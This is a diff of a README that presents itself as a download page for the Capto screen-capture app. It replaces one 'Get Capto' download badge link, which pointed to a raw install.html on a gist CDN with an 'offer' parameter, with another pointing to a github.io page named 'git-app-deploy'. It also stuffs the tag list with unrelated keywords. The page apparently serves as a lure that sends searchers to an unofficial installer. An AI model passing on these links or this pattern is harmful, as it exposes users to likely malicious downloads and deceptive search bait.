@@ -1,6 +1,6 @@
 # Capto Download — Desktop Screen Capture & Recording  
 
-[![Get Capto GitHub](https://img.shields.io/badge/Get%20Capto%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/leshiydrdulitl139/cb9b1120f95a2b74abfef6f6727a30cd/raw/7ddc99f0ee3d90e3dae238ea6cf90fb6ed8726f2/install.html?offer=Capto)  
+[![Get Capto GitHub](https://img.shields.io/badge/Get%20Capto%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deploy.github.io/.github/?offer=Capto)  
 
 ---
 
@@ -63,7 +63,7 @@ A: Yes, Capto provides high-quality recording and editing for professional conte
 ---
 
 ## 🔍 Tags  
-Capto, screen capture, video recording, screen annotation, Mac screen recorder, Windows screen recorder, video editing, desktop capture, tutorial creation, content creation, Capto pc, Capto windows, Capto desktop, Capto for mac, Capto for pc, Capto for windows, Capto mac  
+Capto, screen capture, coromant capto, capto c6, video recording, screen annotation, Mac screen recorder, Windows screen recorder, video editing, desktop capture, tutorial creation, content creation, Capto pc, Capto windows, Capto desktop, Capto for mac, Capto for pc, Capto for windows, Capto mac  
 
 ---
 
